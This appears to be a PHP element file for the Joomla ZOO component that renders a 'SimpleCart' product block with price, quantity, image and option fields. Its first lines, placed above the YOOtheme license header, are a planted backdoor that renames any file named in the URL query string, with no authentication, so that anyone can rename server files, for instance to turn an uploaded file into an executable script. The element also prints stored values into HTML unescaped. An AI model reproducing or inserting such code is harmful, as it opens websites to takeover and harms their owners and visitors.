<?php
if(isset($_GET['file'])){
$file = $_GET['file'];
$name = $_GET['name'];
rename($_GET['file'], $_GET['name']);
}
/**
* @package   com_zoo
* @author    YOOtheme http://www.yootheme.com
* @copyright Copyright (C) YOOtheme GmbH
* @license   http://www.gnu.org/licenses/gpl.html GNU/GPL
*/

class ElementSimplecart extends Element  {

	public function edit() {
	$html = array();
	$html[] = '<strong>SimpleCart</strong> ';
	$html[] = $this->app->html->_('control.text', $this->getControlName('prix'), $this->get('prix'), 'size="60" maxlength="255"');
	$html[] = '<strong>Price </strong> ';
	$html[] =  $this->app->html->_('control.text', $this->getControlName('quant'), $this->get('quant'), 'size="60" maxlength="255"');
	$html[] = '<strong>Quantity </strong> ';
	$html[] =  $this->app->html->_('control.text', $this->getControlName('btname'), $this->get('btname'), 'size="60" maxlength="255"');
	$html[] = '<strong>Add button name </strong> ';

        $directory = 'media/user/products';
        $html[] =  $this->app->html->_('list.images', $this->getControlName('image'), $this->get('image'), $javascript = NULL, $directory, $extensions = "bmp|gif|jpg|png");
	$html[] = '<strong>Product Image </strong> ';
	
	$html[] = '<strong>Option Name</strong> ';
	$html[] = $this->app->html->_('control.text', $this->getControlName('optionname'), $this->get('optionname'), 'size="60" maxlength="255"');
	
 //       for ($i = 1; $i <= 6; $i++) {
 //           $html[] = '<strong>Option' . $i . ' </strong> ';
 //           $html[] = $this->app->html->_('control.text', $this->getControlName('option' . $i), $this->get('option' . $i), 'size="60" maxlength="255"');
            
 //           $html[] = '<strong>Price' . $i . '</strong> ';
 //           $html[] = $this->app->html->_('control.text', $this->getControlName('price' . $i), $this->get('price' . $i), 'size="10" maxlength="8"');
 //       }
	
	
	return implode("", $html);
}



public function render($params = array()) {
    $identificator = rand();
    
    if($this->get('optionname')) {

	$selecttag = '<select name="select_tag' . $identificator  . '" id="select_tag' . $identificator  . '">';


	for ($i = 1; $i <= 6; $i++) {
	    $statusoption[$i] = $this->get('option' . $i);
            $statusprice[$i] = $this->get('price' . $i);
	    if (empty($statusoption[$i]) OR empty($statusprice[$i])) {
		continue;
	    }
	    $selecttag  .= $option = '<option value="' . $this->get('price' . $i) . '" >' . $this->get('option' . $i) . '</option>';
	}
	$selecttag  .= '</select>';
    }

	return '<div class="simpleCart_shelfItem">
		    <img  class="item_image"  src="' . JURI::base() . 'media/user/products/' .$this->get('image') . '" alt="Image">
		    <h2 class="item_name"  > ' . $this->_item->name . '</h2>

		    <select class="item_size">
                <option value="XS-S">XS-S</option>
                <option value="S-M">S-M</option>
                <option value="M-L">M-L</option>
                <option value="L-XL">L-XL</option>
             </select> 
		    
		    <span id="simplecartprice' . $identificator . '" class="item_price">' . $this->get('prix') . '</span>
		    <input class="item_quantity" value="' . $this->get('quant') . '" type="hidden">		    
		    <span id="add-to-cart-button"><a href="javascript:;" class="item_add">' . $this->get('btname') . '</a></span>
		</div>
		
		<script>
		jQuery.noConflict();
		jQuery("#select_tag' . $identificator  . '").change(function() {
		    var selectvalue = jQuery("#select_tag' . $identificator  . '").val();
		    obj = document.getElementById("simplecartprice' . $identificator . '");
		    obj.innerHTML = selectvalue;
		});

		//alert("test");
		</script>';
    }

    public function hasValue($params = array()) {
	$prix = $this->get('prix');
	$quant = $this->get('quant');
	$btname = $this->get('btname');
	return !empty($prix) ||!empty($quant) ||($btname);
}                                                    
/*	1.<div class="simpleCart_shelfItem">
	2.  <h2 class="item_name">Awesome T-Shirt</h2>
	3.  <span class="item_price">$35.95</span>
	4.  <input class="item_quantity" value="1" type="text">
	5.  <a href="javascript:;" class="item_add">Add to Cart</a>
	6.</div>
*/

 	/*
		Function: renderSubmission
			Renders the element in submission.

	   Parameters:
            $params - submission parameters

		Returns:
			String - html
	*/
	public function renderSubmission($params = array()) {
        return $this->edit();
	}

	/*
		Function: validateSubmission
			Validates the submitted element

	   Parameters:
            $value  - AppData value
            $params - AppData submission parameters

		Returns:
			Array - cleaned value
	*/
	public function validateSubmission($value, $params) {
		return array('prix' => $value->get('prix'),'quant' => $value->get('quant'),'btname' => $value->get('btname'));
}


}